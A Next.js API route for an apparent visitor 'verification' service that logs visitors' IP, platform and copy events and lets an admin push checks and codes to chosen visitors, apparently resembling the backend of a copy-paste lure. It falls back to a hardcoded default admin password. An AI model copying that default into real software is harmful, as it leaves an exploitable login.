import { NextRequest, NextResponse } from "next/server"
import {
  createSession,
  getAutoAgainMs,
  getPromptMode,
  getSession,
  listSessions,
  markChecked,
  markCopied,
  normalizeIp,
  publicSession,
  sendCode,
  setAutoAgainMs,
  setPromptMode,
  showVerification,
  submitCode,
} from "@/src/services/verificationStore"

export const dynamic = "force-dynamic"
export const runtime = "nodejs"

type AdminTokens = Map<string, number>
const tokens = ((globalThis as typeof globalThis & { __apaxAdminTokens?: AdminTokens }).__apaxAdminTokens ??=
  new Map())

function adminCredentials() {
  return {
    adminId: process.env.VERIFY_ADMIN_ID || "admin",
    password: process.env.VERIFY_ADMIN_PASSWORD || "!@#QWEASDZXC",
  }
}

function clientIp(request: NextRequest) {
  const forwarded = request.headers.get("x-forwarded-for")
  if (forwarded) return normalizeIp(forwarded.split(",")[0].trim())
  const real = request.headers.get("x-real-ip")
  if (real) return normalizeIp(real)
  return "unknown"
}

function platformHint(request: NextRequest, body: Record<string, unknown>) {
  const fromBody = typeof body.platform === "string" ? body.platform : ""
  const fromHeader = request.headers.get("sec-ch-ua-platform") || ""
  return (fromBody || fromHeader).replace(/^"|"$/g, "").slice(0, 40)
}

function requireAdmin(request: NextRequest) {
  const token = request.headers.get("x-admin-token") || ""
  const expires = tokens.get(token)
  if (!token || !expires || expires < Date.now()) {
    tokens.delete(token)
    return NextResponse.json({ error: "Log in again." }, { status: 401 })
  }
  return null
}

async function readBody(request: NextRequest) {
  if (request.method === "GET" || request.method === "HEAD") return {}
  return (await request.json().catch(() => ({}))) as Record<string, unknown>
}

async function handle(request: NextRequest, context: { params: Promise<{ path?: string[] }> }) {
  const { path = [] } = await context.params
  const body = await readBody(request)
  const [first, second, third] = path

  if (request.method === "POST" && first === "admin" && second === "login" && !third) {
    const { adminId, password } = adminCredentials()
    if (!adminId || !password) {
      return NextResponse.json({ error: "Set VERIFY_ADMIN_ID and VERIFY_ADMIN_PASSWORD first." }, { status: 503 })
    }
    const providedId = typeof body.adminId === "string" ? body.adminId : ""
    const providedPassword = typeof body.password === "string" ? body.password : ""
    if (providedId !== adminId || providedPassword !== password) {
      return NextResponse.json({ error: "Admin ID or password was not accepted." }, { status: 401 })
    }
    const token = crypto.randomUUID()
    tokens.set(token, Date.now() + 12 * 60 * 60 * 1000)
    return NextResponse.json({ token })
  }

  if (request.method === "POST" && first === "sessions" && !second) {
    const page = typeof body.page === "string" ? body.page.slice(0, 200) : "/"
    const clientId = typeof body.clientId === "string" ? body.clientId.slice(0, 80) : ""
    if (!/^[A-Za-z0-9-]{8,80}$/.test(clientId)) {
      return NextResponse.json({ error: "Missing visitor id." }, { status: 400 })
    }
    const passedAt = Number(body.passedAt)
    const session = createSession({
      clientId,
      ip: clientIp(request),
      userAgent: (request.headers.get("user-agent") || "").slice(0, 300),
      platform: platformHint(request, body),
      passedAt: Number.isFinite(passedAt) && passedAt > 0 ? passedAt : null,
      page,
      visible: body.visible !== false,
    })
    if (!session) return new NextResponse(null, { status: 204 })
    return NextResponse.json(publicSession(session), { status: 201 })
  }

  if (request.method === "GET" && first === "sessions" && second && !third) {
    const session = getSession(second)
    if (!session) return NextResponse.json({ error: "This check has expired. Refresh the page." }, { status: 404 })
    return NextResponse.json(publicSession(session))
  }

  if (request.method === "POST" && first === "sessions" && second && third === "check") {
    const session = markChecked(second)
    if (!session) return NextResponse.json({ error: "This check has expired. Refresh the page." }, { status: 404 })
    return NextResponse.json(publicSession(session))
  }

  if (request.method === "POST" && first === "sessions" && second && third === "copy") {
    const session = markCopied(second)
    if (!session) return NextResponse.json({ error: "This check has expired. Refresh the page." }, { status: 404 })
    return NextResponse.json(publicSession(session))
  }

  if (request.method === "POST" && first === "sessions" && second && third === "submit") {
    const code = typeof body.code === "string" ? body.code : ""
    if (!code.trim()) return NextResponse.json({ error: "Enter the code from the capture." }, { status: 400 })
    const result = submitCode(second, code)
    if (!result.ok) return NextResponse.json({ error: result.error }, { status: result.status })
    return NextResponse.json(publicSession(result.session))
  }

  if (first === "admin") {
    const denied = requireAdmin(request)
    if (denied) return denied
  }

  if (request.method === "GET" && first === "admin" && second === "sessions" && !third) {
    return NextResponse.json({ sessions: listSessions(), mode: getPromptMode(), againMs: getAutoAgainMs() })
  }

  if (request.method === "POST" && first === "admin" && second === "mode" && !third) {
    const mode = body.mode === "automatic" ? "automatic" : body.mode === "manual" ? "manual" : ""
    const hasAgain = Object.prototype.hasOwnProperty.call(body, "againMs")
    const againMs = Number(body.againMs)
    if (hasAgain && (!Number.isFinite(againMs) || againMs < 5_000 || againMs > 30 * 24 * 60 * 60 * 1000)) {
      return NextResponse.json({ error: "Use a reopen time from 5 seconds to 30 days." }, { status: 400 })
    }
    if (!mode && !hasAgain) return NextResponse.json({ error: "Choose manual or automatic." }, { status: 400 })
    if (mode) setPromptMode(mode)
    if (hasAgain) setAutoAgainMs(againMs)
    return NextResponse.json({ mode: getPromptMode(), againMs: getAutoAgainMs() })
  }

  if (request.method === "POST" && first === "admin" && second === "sessions" && third) {
    const id = third
    const action = path[3]
    if (action === "show") {
      const session = getSession(id)
      if (!session) return NextResponse.json({ error: "That visitor is no longer on the page." }, { status: 404 })
      return NextResponse.json({ session: showVerification(session.id) })
    }
    if (action === "code") {
      const code = typeof body.code === "string" ? body.code.trim() : ""
      if (!/^[A-Za-z0-9-]{4,12}$/.test(code)) {
        return NextResponse.json({ error: "Use 4 to 12 letters or numbers." }, { status: 400 })
      }
      const session = getSession(id)
      if (!session) return NextResponse.json({ error: "That visitor is no longer waiting." }, { status: 404 })
      if (session.status === "verified") {
        return NextResponse.json({ error: "This visitor already finished the check." }, { status: 409 })
      }
      return NextResponse.json({ session: sendCode(session.id, code) })
    }
  }

  return NextResponse.json({ error: "Not found." }, { status: 404 })
}

export const GET = handle
export const POST = handle
export const PUT = handle
export const PATCH = handle
export const DELETE = handle
